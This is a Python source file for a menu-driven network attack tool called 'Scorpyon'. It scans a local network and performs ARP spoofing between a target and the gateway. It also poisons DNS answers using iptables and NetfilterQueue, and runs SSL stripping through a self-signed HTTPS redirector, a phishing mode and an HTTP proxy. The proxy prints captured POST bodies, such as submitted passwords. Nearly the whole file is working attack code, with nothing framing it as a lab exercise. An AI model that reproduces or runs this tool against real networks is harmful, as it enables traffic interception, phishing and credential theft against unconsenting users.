import sys
import scapy.all as scapy
import time
import ipaddress
from termcolor import colored
from mac_vendor_lookup import MacLookup
from netfilterqueue import NetfilterQueue
import os
import atexit
import signal
import threading
import errno
import http.server
import socketserver
import socket
import ssl
import subprocess
from typing import Optional

# network
HTTPS_PORT = 443
HTTP_PORT = 80
NETWORK_SCAN_TIMEOUT = 10
ARP_REQUEST_TIMEOUT = 2
ARP_REQUEST_RETRIES = 2
DNS_SPOOF_TTL = 10
NETWORK_SUBNET = "/24"

# netfilter queue
NFQUEUE_NUM = 0

# thread timeouts
THREAD_JOIN_TIMEOUT_SHORT = 2
THREAD_JOIN_TIMEOUT_MEDIUM = 3
THREAD_JOIN_TIMEOUT_LONG = 5
HTTP_SERVER_TIMEOUT = 1.0

# arp spoofing
ARP_SPOOF_INTERVAL = 2  # seconds between spoof packets
ARP_RESTORE_COUNT = 4   # packets sent when restoring ARP

# dns threads
DNS_POLL_INTERVAL = 0.01

# ssl certs
SSL_CERT_FILE = "/tmp/sslstrip_cert.pem"
SSL_KEY_FILE = "/tmp/sslstrip_key.pem"

# ansi escape codes (menu ui)
ANSI_MOVE_UP = '\033[A'
ANSI_CLEAR_LINE = '\033[2K'



website_to_spoof = ""
spoof_ip = ""

#cleanup state logging

cleanup_state = {
    'ip_forward_enabled': False,
    'iptables_set': False,
    'target_ip': None,
    'gateway_ip': None,
    'arp_thread': None,
    'arp_running': False,
    'dns_thread': None,
    'dns_running': False,
    'dns_queue': None,
    'ssl_strip_thread': None,
    'ssl_strip_running': False,
    'ssl_httpd': None,
    'proxy_thread': None,
    'proxy_running': False,
    'proxy_httpd': None
}

# all the services must be properly stopped and the system state restored

def cleanup():
    try:
        print("\n[Cleanup] Restoring system state...")
        #stop proxy
        if cleanup_state['proxy_running']:
            cleanup_state['proxy_running'] = False
            print("[Cleanup] Proxy stopped")
        #stop ssl stripping
        if cleanup_state['ssl_strip_running']:
            cleanup_state['ssl_strip_running'] = False
            print("[Cleanup] SSL stripping stopped")
        #stop dns poisoning
        if cleanup_state['dns_running']:
            cleanup_state['dns_running'] = False
            if cleanup_state['dns_queue']:
                try:
                    cleanup_state['dns_queue'].unbind()
                except Exception:
                    pass
            print("[Cleanup] DNS poisoning stopped")
        #stop arp spoofing
        if cleanup_state['arp_running']:
            cleanup_state['arp_running'] = False
            if cleanup_state['arp_thread']:
                cleanup_state['arp_thread'].join(timeout=THREAD_JOIN_TIMEOUT_SHORT)
        #disable ip forwardin
        if cleanup_state['ip_forward_enabled']:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[Cleanup] IP forwarding disabled")
        #resetting firewall rules (removing what we add)
        if cleanup_state['iptables_set']:
            os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
            os.system(f"iptables -D INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
            os.system(f"iptables -D OUTPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
            print("[Cleanup] iptables rules removed")
        #restore arp tables
        if cleanup_state['target_ip'] and cleanup_state['gateway_ip']:
            print("[Cleanup] Restoring ARP tables...")
            restore(cleanup_state['target_ip'], cleanup_state['gateway_ip'])
            restore(cleanup_state['gateway_ip'], cleanup_state['target_ip'])
            print("[Cleanup] ARP tables restored")
            
        print("[Cleanup] Complete.")
    except Exception as e:
        print(f"[Cleanup] Error: {e}")

# signal handler to ensure cleanup on exit

def signal_handler(sig, frame):
    print(f"\n[Signal] Received signal {sig}, cleaning up...")
    cleanup()
    sys.exit(0)

# process packet function for netfilter queue

def process_packet(packet):
    global website_to_spoof, spoof_ip
    scapy_packet = scapy.IP(packet.get_payload()) # converts to scapy packet
    if scapy_packet.haslayer(scapy.DNSQR): # check if packet is for dns
        qname = scapy_packet[scapy.DNSQR].qname
        if website_to_spoof in qname.decode(): # check if domain is the same as the one we want to spoof
            print(f"[DNS] Spoofing {qname.decode()}")
            
            spoofed_packet = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                             scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=scapy_packet[scapy.UDP].dport) / \
                             scapy.DNS(id=scapy_packet[scapy.DNS].id, qr=1, aa=1, qd=scapy_packet[scapy.DNS].qd, \
                                     an=scapy.DNSRR(rrname=qname, ttl=DNS_SPOOF_TTL, rdata=spoof_ip)) # create spoofed packet
            
            scapy.send(spoofed_packet, verbose=False) # send spoofed packet
            packet.drop() # drop original packet
            return

    packet.accept() # accept original packet if it is not for dns

# scan network for ip addresses, mac and vendor (just use nmap for this but i thought it was fun to implement)

def scan_network():
    try:
        local_ip=scapy.get_if_addr(scapy.conf.iface)
        network_range=ipaddress.ip_network(f"{local_ip}{NETWORK_SUBNET}", strict=False)
    except Exception as e:
        print(f"Could not determine network range: {e}")
        return
    print(f"Scanning {network_range}...")
    arp_request=scapy.ARP(pdst=str(network_range))
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet=broadcast/arp_request # we scan by broadcasting an arp request
    try:
        answered, unanswered=scapy.srp(packet, timeout=NETWORK_SCAN_TIMEOUT, verbose=False)
    except PermissionError:
        print("Permission denied. Run as root/Administrator.")
        return
    clients=[]
    for sent, received in answered:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("\nIP Address\t\tMAC Address\t\tVendor")
    for client in clients:
        try:
            vendor = MacLookup().lookup(client['mac'])
        except:
            vendor = "Unknown"
        print(colored(f"{client['ip']}", 'blue'),f"\t\t{client['mac']}",f"\t\t{vendor}")

# get mac address of a host

def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast=broadcast/arp_req
    answered_list=scapy.srp(arp_req_broadcast, timeout=ARP_REQUEST_TIMEOUT, retry=ARP_REQUEST_RETRIES, verbose = False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

#arp spoofing

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    if not target_mac:
        print(f"\n[ARP] Could not find MAC for {target_ip}. Host may be down.")
        return False
    packet=scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # creates an arp response packet
    scapy.sendp(packet, verbose = False)
    return True

# restore arp tables

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    if not destination_mac or not source_mac:
        print(f"[ARP] Warning: Could not restore ARP for {destination_ip}")
        return
    packet=scapy.Ether(dst=destination_mac)/scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=ARP_RESTORE_COUNT, verbose=False)

# arp spoofing thread

def arp_spoof_thread(target_ip, gateway_ip):
    print(f"[ARP] Spoofing thread started for {target_ip}")
    
    while cleanup_state['arp_running']:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(ARP_SPOOF_INTERVAL)
    print(f"\n[ARP] Spoofing thread stopped")

def start_arp_spoofing():
    if os.geteuid() != 0:
        print("This action requires root privileges. Please run as root.")
        return
    
    if cleanup_state['arp_running']:
        print("[ARP] ARP spoofing is already running!")
        return
    
    target_ip=input("Please input the target IP: ")
    gateway_ip=scapy.conf.route.route("0.0.0.0")[2]
    
    print(f"[ARP] Target: {target_ip}")
    print(f"[ARP] Gateway: {gateway_ip}")
    
    if not get_mac(target_ip):
        print(f"[ARP] Error: Cannot reach target {target_ip}")
        return
    if not get_mac(gateway_ip):
        print(f"[ARP] Error: Cannot reach gateway {gateway_ip}")
        return
    
    cleanup_state['target_ip'] = target_ip
    cleanup_state['gateway_ip'] = gateway_ip
    cleanup_state['ip_forward_enabled'] = True
    cleanup_state['arp_running'] = True
    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[ARP] IP forwarding enabled")
    
    cleanup_state['arp_thread'] = threading.Thread(
        target=arp_spoof_thread, 
        args=(target_ip, gateway_ip),
        daemon=True
    ) # creates a thread for arp spoofing such that we can do other stuff while it runs
    cleanup_state['arp_thread'].start()
    print("[ARP] ARP spoofing started in background")
    print("[ARP] You can now start DNS poisoning or other attacks")

def stop_arp_spoofing():
    if not cleanup_state['arp_running']:
        print("[ARP] ARP spoofing is not running")
        return
    
    print("\n[ARP] Stopping ARP spoofing...")
    cleanup_state['arp_running'] = False
    
    if cleanup_state['arp_thread']:
        cleanup_state['arp_thread'].join(timeout=THREAD_JOIN_TIMEOUT_LONG)
    
    if cleanup_state['target_ip'] and cleanup_state['gateway_ip']:
        restore(cleanup_state['target_ip'], cleanup_state['gateway_ip'])
        restore(cleanup_state['gateway_ip'], cleanup_state['target_ip'])
        print("[ARP] ARP tables restored")
    
    #probably should double check with 'sysctl net.ipv4.ip_forward' (?)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[ARP] IP forwarding disabled")
    
    cleanup_state['ip_forward_enabled'] = False
    cleanup_state['target_ip'] = None
    cleanup_state['gateway_ip'] = None
    print("[ARP] Done.")

# dns poisoning thread

def dns_poison_thread():
    try:
        queue = NetfilterQueue()
        cleanup_state['dns_queue'] = queue
        queue.bind(NFQUEUE_NUM, process_packet)
        
        while cleanup_state['dns_running']:
            try:
                queue.run(block=False)
            except Exception:
                pass
            time.sleep(DNS_POLL_INTERVAL) 
            
    except Exception as e:
        print(f"[DNS] Error in DNS thread: {e}")
    finally:
        cleanup_state['dns_running'] = False
        print("[DNS] Thread stopped.")

def start_dns_poisoning():
    global website_to_spoof, spoof_ip
    
    if os.geteuid() != 0:
        print("This action requires root privileges. Please run as root.")
        return
    
    if cleanup_state['dns_running']:
        print("[DNS] DNS poisoning is already running!")
        return
    
    if not cleanup_state['arp_running']:
        print("[DNS] Warning: ARP spoofing is not running!")
        print("[DNS] Start ARP spoofing first to intercept traffic")
        choice = input("[DNS] Continue anyway? (y/n): ")
        if choice.lower() != 'y':
            return
    
    website_to_spoof = input("Enter the website to spoof (e.g., google.com): ")
    spoof_ip = input("Enter the IP to redirect to (your IP): ")
    
    if not cleanup_state['ip_forward_enabled']:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        cleanup_state['ip_forward_enabled'] = True
    
    print("[DNS] Setting up iptables rules...")
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM}")
    os.system(f"iptables -I INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM}")
    os.system(f"iptables -I OUTPUT -j NFQUEUE --queue-num {NFQUEUE_NUM}")
    cleanup_state['iptables_set'] = True
    
    cleanup_state['dns_running'] = True
    cleanup_state['dns_thread'] = threading.Thread(
        target=dns_poison_thread,
        daemon=True
    )
    cleanup_state['dns_thread'].start()
    
    print(f"[DNS] DNS poisoning started in background: {website_to_spoof} -> {spoof_ip}")
    print("[DNS] You can now start SSL stripping or other attacks")

def stop_dns_poisoning():

    if not cleanup_state['dns_running']:
        print("[DNS] DNS poisoning is not running")
        return
    
    print("[DNS] Stopping DNS poisoning...")
    cleanup_state['dns_running'] = False
    if cleanup_state['dns_queue']:
        try:
            cleanup_state['dns_queue'].unbind()
        except Exception:
            pass
        cleanup_state['dns_queue'] = None
    
    if cleanup_state['dns_thread']:
        cleanup_state['dns_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
        cleanup_state['dns_thread'] = None
    os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
    os.system(f"iptables -D INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
    os.system(f"iptables -D OUTPUT -j NFQUEUE --queue-num {NFQUEUE_NUM} 2>/dev/null")
    cleanup_state['iptables_set'] = False
    
    print("[DNS] Done.")

# ssl stripping

class _RedirectHandler(http.server.BaseHTTPRequestHandler):
    # http server handler that redirects https to http
    target_host: Optional[str] = None

    def log_message(self, format, *args):
        return

    def do_GET(self):
        print(f"[SSL] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}{self.path}")
        self.send_response(301)
        self.send_header("Location", f"http://{self.target_host}{self.path}")
        self.end_headers()

    def do_POST(self):
        self.do_GET()


class _PhishingHandler(http.server.SimpleHTTPRequestHandler):
    phishing_directory: Optional[str] = None

    def __init__(self, *args, **kwargs):
        directory = self.phishing_directory or os.getcwd()
        super().__init__(*args, directory=directory, **kwargs)

    def log_message(self, format, *args):
        print(f"[Phishing] {self.client_address[0]} - {args[0] if args else ''}")


class _ProxyHandler(http.server.BaseHTTPRequestHandler):
    # http proxy to fetch real https site
    target_host: Optional[str] = None
    target_ip: Optional[str] = None 

    def log_message(self, format, *args):
        return

    def _proxy_request(self, method='GET', body=None):
        connect_host = self.target_ip if self.target_ip else self.target_host
        
        try:
            sock = socket.create_connection((connect_host, 443), timeout=10)
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssl_sock = ctx.wrap_socket(sock, server_hostname=self.target_host)
            
            headers = {
                'Host': self.target_host,
                'Connection': 'close'
            }
            for header in ['User-Agent', 'Accept', 'Accept-Language', 'Cookie', 'Content-Type']:
                if header in self.headers:
                    headers[header] = self.headers[header]
            
            request_line = f"{method} {self.path} HTTP/1.1\r\n"
            header_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
            if body:
                header_lines += f"Content-Length: {len(body)}\r\n"
            request = request_line + header_lines + "\r\n"
            
            ssl_sock.sendall(request.encode())
            if body:
                ssl_sock.sendall(body)
            
            response = b""
            while True:
                chunk = ssl_sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            ssl_sock.close()
            
            header_end = response.find(b"\r\n\r\n")
            header_data = response[:header_end].decode('utf-8', errors='ignore')
            content = response[header_end + 4:]
            status_line = header_data.split("\r\n")[0]
            status_code = int(status_line.split(" ")[1])
            
            content_type = "text/html"
            for line in header_data.split("\r\n"):
                if line.lower().startswith("content-type:"):
                    content_type = line.split(":", 1)[1].strip()
                    break
            
            self.send_response(status_code)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', len(content))
            self.end_headers()
            self.wfile.write(content)
                
        except Exception as e:
            print(f"[Proxy] Error fetching https://{connect_host}{self.path}: {e}")
            self.send_response(502)
            self.end_headers()

    def do_GET(self):
        print(f"[Proxy] GET {self.path} from {self.client_address[0]}")
        self._proxy_request('GET')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        print(f"[Proxy] POST {self.path} from {self.client_address[0]}")
        print(f"[Proxy] >>> POST DATA: {body.decode('utf-8', errors='ignore')}")
        
        self._proxy_request('POST', body)


def _ensure_self_signed_cert(cert_file: str, key_file: str) -> None:
    # generate a self-signed certificate if it doesn't exist
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return
    print("[SSL] Generating self-signed certificate...")
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-keyout",
            key_file,
            "-out",
            cert_file,
            "-days",
            "1",
            "-nodes",
            "-subj",
            "/CN=sslstrip",
        ],
        check=False,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print("[SSL] Certificate generated.")


def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file: str, 
                      proxy_mode: bool = True, phishing_dir: Optional[str] = None) -> None:
    socketserver.TCPServer.allow_reuse_address = True
    
    if proxy_mode:
        # proxy mode (actual ssl stripping)
        _RedirectHandler.target_host = site_to_spoof
        handler_class = _RedirectHandler
        mode_desc = f"redirecting to http://{site_to_spoof}"
    else:
        # phishing (more like ssl spoofing)
        _PhishingHandler.phishing_directory = phishing_dir
        handler_class = _PhishingHandler
        mode_desc = f"serving phishing content from {phishing_dir}"
    
    try:
        httpd = socketserver.TCPServer((bind_ip, HTTPS_PORT), handler_class)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=cert_file, keyfile=key_file)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        cleanup_state['ssl_httpd'] = httpd
        
        print(f"[SSL] Listening on {bind_ip}:{HTTPS_PORT} and {mode_desc}")
        print("[SSL] SSL server running in background. Return to menu.")
        
        httpd.timeout = HTTP_SERVER_TIMEOUT
        
        while cleanup_state['ssl_strip_running']:
            httpd.handle_request()
        
        httpd.server_close()
        cleanup_state['ssl_httpd'] = None
        print("[SSL] Server stopped.")
        
    except OSError as exc:
        if exc.errno == errno.EADDRNOTAVAIL:
            print(f"[SSL] Cannot bind to {bind_ip}. Address not available.")
        elif exc.errno == errno.EACCES:
            print(f"[SSL] Permission denied binding to port {HTTPS_PORT}. Run with sudo/root.")
        elif exc.errno == errno.EADDRINUSE:
            print(f"[SSL] Port {HTTPS_PORT} is already in use.")
        else:
            print(f"[SSL] Failed to start HTTPS server: {exc}")
        cleanup_state['ssl_strip_running'] = False
    except Exception as e:
        print(f"[SSL] Error in SSL thread: {e}")
        cleanup_state['ssl_strip_running'] = False


def start_ssl_stripping():
    global website_to_spoof, spoof_ip
    
    if os.geteuid() != 0:
        print("This action requires root privileges. Please run as root.")
        return
    
    if cleanup_state['ssl_strip_running']:
        print("[SSL] SSL stripping is already running!")
        return
    
    if not cleanup_state['arp_running']:
        print("[SSL] Warning: ARP spoofing is not running!")
        print("[SSL] Start ARP spoofing first to intercept traffic")
        choice = input("[SSL] Continue anyway? (y/n): ")
        if choice.lower() != 'y':
            return
    
    proxy_mode = not cleanup_state['dns_running']
    
    site_to_spoof = input("Enter the website to strip SSL from (e.g., example.com): ")
    try:
        bind_ip = scapy.get_if_addr(scapy.conf.iface)
    except Exception:
        bind_ip = input("Could not auto-detect IP. Enter bind IP: ")
    
    if not bind_ip or bind_ip == "0.0.0.0":
        bind_ip = input("Enter the IP to bind to: ")
    
    cert_file = SSL_CERT_FILE
    key_file = SSL_KEY_FILE
    
    print(f"[SSL] SSL STRIP {'(PROXY MODE)' if proxy_mode else ''}")
    print(f"[SSL] Interface: {scapy.conf.iface}")
    print(f"[SSL] Binding HTTPS redirector on {bind_ip}:{HTTPS_PORT}")
    
    if proxy_mode:
        print(f"[SSL] Proxy will fetch from https://{site_to_spoof}")
        
        import socket
        try:
            target_ip = socket.gethostbyname(site_to_spoof)
            print(f"[SSL] Resolved {site_to_spoof} -> {target_ip}")
        except socket.gaierror:
            print(f"[SSL] Warning: Could not resolve {site_to_spoof}, proxy may fail")
            target_ip = None
        
        print(f"[SSL] Auto-starting DNS poisoning: {site_to_spoof} -> {bind_ip}")
        website_to_spoof = site_to_spoof
        spoof_ip = bind_ip
        
        if not cleanup_state['ip_forward_enabled']:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            cleanup_state['ip_forward_enabled'] = True
        
        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM}")
        os.system(f"iptables -I INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM}")
        cleanup_state['iptables_set'] = True
        
        cleanup_state['dns_running'] = True
        cleanup_state['dns_thread'] = threading.Thread(
            target=dns_poison_thread,
            daemon=True
        )
        cleanup_state['dns_thread'].start()
        print(f"[SSL] DNS poisoning auto-started")
        phishing_dir = None
    else:
        print(f"[SSL] PHISHING MODE - will serve fake site over HTTPS")
        phishing_dir = input("Enter path to phishing content directory (default: current dir): ").strip()
        if not phishing_dir:
            phishing_dir = os.getcwd()
        if not os.path.isdir(phishing_dir):
            print(f"[SSL] Error: {phishing_dir} is not a valid directory")
            return
        print(f"[SSL] Serving files from: {phishing_dir}")
        target_ip = None
    
    _ensure_self_signed_cert(cert_file, key_file)
    
    cleanup_state['ssl_strip_running'] = True
    
    cleanup_state['ssl_strip_thread'] = threading.Thread(
        target=_ssl_strip_thread,
        args=(bind_ip, site_to_spoof, cert_file, key_file, proxy_mode, phishing_dir),
        daemon=True
    )
    cleanup_state['ssl_strip_thread'].start()
    
    if proxy_mode:
        start_proxy(bind_ip, site_to_spoof, target_ip)
    
    print("[SSL] SSL stripping started in background")


def stop_ssl_stripping():
    if not cleanup_state['ssl_strip_running']:
        print("[SSL] SSL stripping is not running")
        return
    
    print("[SSL] Stopping SSL stripping...")
    cleanup_state['ssl_strip_running'] = False
    
    if cleanup_state['ssl_strip_thread']:
        cleanup_state['ssl_strip_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
        cleanup_state['ssl_strip_thread'] = None
    
    if cleanup_state['proxy_running']:
        stop_proxy()
    
    if cleanup_state['dns_running']:
        stop_dns_poisoning()
    
    print("[SSL] Done.")


def _proxy_thread(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = None) -> None:
    _ProxyHandler.target_host = site_to_spoof
    _ProxyHandler.target_ip = target_ip
    socketserver.TCPServer.allow_reuse_address = True
    
    try:
        httpd = socketserver.TCPServer((bind_ip, HTTP_PORT), _ProxyHandler)
        cleanup_state['proxy_httpd'] = httpd
        
        print(f"[Proxy] Listening on {bind_ip}:{HTTP_PORT}")
        if target_ip:
            print(f"[Proxy] Fetching via IP: {target_ip} (Host: {site_to_spoof})")
        else:
            print(f"[Proxy] Proxying to https://{site_to_spoof}")
        
        httpd.timeout = HTTP_SERVER_TIMEOUT
        
        while cleanup_state['proxy_running']:
            httpd.handle_request()
            
    except OSError as exc:
        if exc.errno == errno.EACCES:
            print(f"[Proxy] Permission denied binding to port {HTTP_PORT}. Run with sudo/root.")
        elif exc.errno == errno.EADDRINUSE:
            print(f"[Proxy] Port {HTTP_PORT} is already in use.")
        else:
            print(f"[Proxy] Failed to start proxy: {exc}")
        cleanup_state['proxy_running'] = False
    except Exception as e:
        print(f"[Proxy] Error: {e}")
        cleanup_state['proxy_running'] = False


def start_proxy(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = None):
    if cleanup_state['proxy_running']:
        print("[Proxy] Proxy is already running!")
        return
    
    cleanup_state['proxy_running'] = True
    cleanup_state['proxy_thread'] = threading.Thread(
        target=_proxy_thread,
        args=(bind_ip, site_to_spoof, target_ip),
        daemon=True
    )
    cleanup_state['proxy_thread'].start()
    print("[Proxy] HTTP proxy started in background")


def stop_proxy():
    if not cleanup_state['proxy_running']:
        return
    
    print("[Proxy] Stopping proxy...")
    cleanup_state['proxy_running'] = False
    
    if cleanup_state['proxy_thread']:
        cleanup_state['proxy_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
        cleanup_state['proxy_thread'] = None
    
    print("[Proxy] Done.")

menu_lines_count = 0

# ui part

def clear_menu_lines(num_lines):
    for _ in range(num_lines):
        sys.stdout.write(f'{ANSI_MOVE_UP}\r{ANSI_CLEAR_LINE}')
    sys.stdout.flush()

def print_menu(clear_previous=True):
    global menu_lines_count
    
    if clear_previous and menu_lines_count > 0:
        clear_menu_lines(menu_lines_count)
    lines = []
    lines.append(colored("\n[...Scorpyon...]", 'green'))
    if not cleanup_state['arp_running']:
        lines.append("1. Start ARP spoofing (background)")
    else:
        lines.append("1. Stop ARP spoofing")
    if not cleanup_state['dns_running']:
        lines.append("2. Start DNS poisoning")
    else:
        lines.append("2. Stop DNS poisoning")
    if not cleanup_state['ssl_strip_running']:
        if cleanup_state['dns_running']:
            lines.append("3. Start SSL stripping (phishing with custom html)")
        else:
            lines.append("3. Start SSL stripping (proxy)")
    else:
        lines.append("3. Stop SSL stripping")
    lines.append("4. Scan network")
    lines.append("5. Exit")
    lines.append("")

    for line in lines:
        print(line)
    
    menu_lines_count = len(lines) + 1

def main():
    atexit.register(cleanup)
    signal.signal(signal.SIGTERM, signal_handler)
    print(colored("""

                                                %%%%                            
                                             %*+++++**%                         
                                           =+++++++*#+++=                       
                                          %++*****+% %**+@                      
                                          %**%         %++%#                    
                                           %+%         %+=##                    
                                                        %+++%                   
                                                        %*+*%                   
                                                       %++##%                   
                                                      %*++*+%                   
                                  ###++**           ##=+**%#                    
                               %%%++%***+%         %**+++%                      
                            %%#**+%***%%%*+%  %%#*+++++*%                       
                            %**%+*%%**%%%*++%%+++***+++%                        
                           %**#%%%*+%***+%%++++******%***%                      
                      %%% %*%%#**%%***++++++****%#***%%*+%                      
                    *%**+%%%%%%%%%%*++*****+++%%****%+%*+*%#                    
                  %+*+*+++********++++++++++%++***+%*+%%++%#                    
                 %****++*%%   .%*@**++++++*%**%%++=%**%%*+*#%                   
                %***%%++%%     %*%%%****#%%**% %+++%%++%%*=+%                   
                %*%%++*%    %%%%%%%%%     %+*%  %#*+%*+*%+++@                   
                %% %+=%    %*++++++++%   %*+*%  %**+%%*+%%=++%                  
                          %%%%#**++++++*****%   %#**%%++%                       
                          %%%%%%**++*++*#%       :%*+% %%%                      
                          %**+****++**%%%        :%%*+%                         
                            %%%%%%%                                             
                                
    """, 'green'))
    
    while True:
        global menu_lines_count
        print_menu()
        choice = input("> ")
        clear_menu_lines(menu_lines_count)
        menu_lines_count = 0
        if choice == '1' and not cleanup_state['arp_running']:
            start_arp_spoofing()
        elif choice == '1' and cleanup_state['arp_running']:
            stop_arp_spoofing()
        elif choice == '2' and not cleanup_state['dns_running']:
            start_dns_poisoning()
        elif choice == '2' and cleanup_state['dns_running']:
            stop_dns_poisoning()
        elif choice == '3' and not cleanup_state['ssl_strip_running']:
            start_ssl_stripping()
        elif choice == '3' and cleanup_state['ssl_strip_running']:
            stop_ssl_stripping()
        elif choice == '4':
            scan_network()
        elif choice == '5':
            if cleanup_state['arp_running']:
                print("Stopping ARP spoofing before exit...")
                stop_arp_spoofing()
            if cleanup_state['dns_running']:
                print("Stopping DNS poisoning before exit...")
                stop_dns_poisoning()
            if cleanup_state['ssl_strip_running']:
                print("Stopping SSL stripping before exit...")
                stop_ssl_stripping()
            break

if __name__ == "__main__":
    main()
